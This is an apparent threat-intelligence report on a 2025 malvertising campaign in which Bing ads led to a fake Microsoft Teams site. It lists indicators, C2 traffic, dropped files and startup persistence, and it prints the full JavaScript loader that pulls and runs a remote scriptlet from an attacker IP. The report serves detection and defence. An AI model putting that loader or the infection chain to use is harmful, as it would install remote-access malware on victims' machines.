2025-01-22 (WEDNESDAY): MALICIOUS ADS ON BING SEARCH LEAD TO MALWARE

AUTHORS:

- Bradley Duncan, Zach Diehl

REFERENCES:

- https://www.linkedin.com/posts/unit42_2025-01-22-wednesday-a-malicious-ad-led-activity-7288213662329192450-ky3V/
- https://x.com/Unit42_Intel/status/1882448037030584611

NOTES:

- Our telemetry revealed a recent malicious Bing Search ad leading to a fake Microsoft Teams page.
- We were able to replicate the activity on Wednesday, 2025-01-22.
- We also found additional ads leading to sites impersonating other software programs.
- These ads are short-lived, and recent examples involve a root domain of burleson-appliance[.]net registered on 2025-01-20.
- Examples of the sub-domains used by these ads are available at: https://urlscan.io/search/#burleson-appliance.net
- Files from this activity are often not malicious individually but rely on the other files for a successful infection.
- IP addresses and domains for this campaign frequently change, and this post is a snapshot from 2025-01-22 starting at 21:37 UTC.

DATE AND START TIME OF THIS TEST RUN:

- 2025-01-22 21:37 UTC

FROM MALICIOUS AD FOR FAKE TEAMS WEBSITE AND ASSOCIATED FILE DOWNLOAD:

- hxxps[:]//www.bing[.]com/aclk?ld=e8PH8aLxSiJxjw4Si9lgLztzVUCUwCJ7LeV4z4DsU61Sx3HWK9X1fxNGVCWc4jKyspIeWPFeqVejCDavG1lRWD4Ukf127WLw1hUPnGntv_1Y1z30t5JNXJyKZ986BV2aP3kDwSnS0DDaXYX4hQcab6syHfzjtxZLUNJD5oG8MEhJwV-_N_vpfcrfaGeRQCbjbYwL3zeQ&u=aHR0cHMlM2ElMmYlMmZtaWNyb3NvZnQtdGVhbXMtZG93bmxvYWQuYnVybGVzb24tYXBwbGlhbmNlLm5ldCUzZm1zY2xraWQlM2Q5ZTYxNDgwMjZjMzIxNTJlM2ZkYzJmOTMwZDQ5MjNiYw&rlid=9e6148026c32152e3fdc2f930d4923bc&ntb=1

- Cloudflare IP:443 - hxxps[:]//microsoft-teams-download.burleson-appliance[.]net/?msclkid=9e6148026c32152e3fdc2f930d4923bc

- 82.221.136.26:443 - hxxps[:]//microsoft.teams-live[.]com/en/index.html?msclkid=9e6148026c32152e3fdc2f930d4923bc

- 82.221.136.26:443 - hxxps[:]//microsoft.teams-live[.]com/en/download.php

INITIAL FILE DOWNLOAD:

- SHA256 hash: 4bed34b1cd5663a5a857b3bbf81cc5413c61cb561e9a90067b57da08b01ae70b
- File size: 72 bytes
- File name: application_setup.js
- File type: ASCII text, with no line terminators
- Content: GetObject("scriptlet:hxxp[:]//5.252.153[.]241:80/api/file/get-file/264872");

TRAFFIC GENERATED AFTER RUNNING THE ABOVE FILE WITH WSCRIPT.EXE:

- 2025-01-22 21:37:59 UTC - hxxp[:]//5.252.153[.]241/api/file/get-file/264872
- 2025-01-22 21:38:01 UTC - hxxp[:]//5.252.153[.]241/api/file/get-file/29842.ps1
- 2025-01-22 21:38:01 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:06 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:12 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:17 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:22 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:27 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:33 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:38 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:44 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:49 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:54 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:38:59 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:04 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:06 UTC - hxxp[:]//5.252.153[.]241/api/file/get-file/TeamViewer
- 2025-01-22 21:39:07 UTC - hxxp[:]//5.252.153[.]241/api/file/get-file/Teamviewer_Resource_fr
- 2025-01-22 21:39:08 UTC - hxxp[:]//5.252.153[.]241/api/file/get-file/TV
- 2025-01-22 21:39:08 UTC - hxxp[:]//5.252.153[.]241/api/file/get-file/pas.ps1
- 2025-01-22 21:39:08 UTC - hxxp[:]//5.252.153[.]241/8182020?k=message%20=%20startup%20shortcut%20created;%20%20status%20=%20success;
- 2025-01-22 21:39:09 UTC - hxxp[:]//5.252.153[.]241/8182020?k=script:%20RunRH,%20status:%20OK,%20message:%20PS%20process%20started
- 2025-01-22 21:39:14 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:17 UTC - 45.125.66[.]32:2917 - HTTPS/TLSv1.2 traffic, self-signed certificate
- 2025-01-22 21:39:20 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:25 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:31 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:32 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:32 UTC - 45.125.66[.]32:2917 - HTTPS/TLSv1.2 traffic, self-signed certificate
- 2025-01-22 21:39:38 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:43 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:47 UTC - 45.125.66[.]32:2917 - HTTPS/TLSv1.2 traffic, self-signed certificate
- 2025-01-22 21:39:49 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:55 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:39:57 UTC - 45.125.66[.]252:443 - HTTPS/TLSv1.2 traffic, self-signed certificate
- 2025-01-22 21:40:01 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:07 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:13 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:19 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:25 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:30 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:35 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:41 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:46 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:52 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:40:58 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:41:04 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:41:09 UTC - hxxp[:]//5.252.153[.]241/8182020
- 2025-01-22 21:41:15 UTC - hxxp[:]//5.252.153[.]241/8182020
- Note: The 8182020 suffix on the repeating URLs is a unique identifier for the infected Windows host.

FILES RETRIEVED FROM AN INFECTED WINDOWS HOST:

- a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e      1,553 bytes  C:\ProgramData\huo\pas.ps1
- 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192    668,968 bytes  C:\ProgramData\huo\Teamviewer_Resource_fr.dll
- 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e  4,380,968 bytes  C:\ProgramData\huo\TeamViewer.exe
- 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7     12,920 bytes  C:\ProgramData\huo\TV.dll
- fd045fcede68ce2fda2531a9dd28f407aab0f29b3dd3c86e017172abee93386c    264,836 bytes  C:\ProgramData\jsLeow\skqllz.ps1

PERSISTENCE:

- C:\ProgramData\huo\TeamViewer.exe made persistent through a Window shortcut in the Start Menu Startup directory at:
  C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\TeamViewer.lnk
